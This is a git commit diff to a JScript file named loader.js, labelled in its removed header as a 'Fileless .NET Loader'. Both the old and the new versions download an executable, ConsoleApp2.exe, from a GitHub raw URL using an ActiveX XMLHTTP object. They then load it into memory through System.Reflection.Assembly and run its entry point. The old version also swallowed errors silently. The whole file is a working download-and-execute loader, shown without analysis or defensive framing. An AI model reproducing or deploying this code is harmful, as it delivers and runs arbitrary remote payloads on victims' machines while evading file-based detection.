b381926694ecd82b7a4ed4b1fb8bff93ba270339
andrevital771-debug <andrevital771@gmail.com>
2025-11-02 16:52:43 -0300

    Update loader.js

--- loader.js
+++ loader.js
@@ -1,16 +1,8 @@
-// loader.js - Fileless .NET Loader
-try {
-    var x = new ActiveXObject("Microsoft.XMLHTTP");
-    x.open("GET", "https://raw.githubusercontent.com/andrevital771-debug/Loucura/main/ConsoleApp2.exe", false);
-    x.send();
-    
-    if (x.status == 200) {
-        var data = x.responseBody;
-        var assembly = new ActiveXObject("System.Reflection.Assembly");
-        var loaded = assembly.Load(data);
-        var entry = loaded.GetEntryPoint();
-        entry.Invoke(null, null);
-    }
-} catch(e) {
-    // Fail silently
-}
+var x = new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET", "https://raw.githubusercontent.com/andrevital771-debug/Loucura/main/ConsoleApp2.exe", false);
+x.send();
+
+var bytes = x.responseBody;
+var assembly = new ActiveXObject("System.Reflection.Assembly");
+var loaded = assembly.Load(bytes);
+loaded.GetEntryPoint().Invoke(null, null);
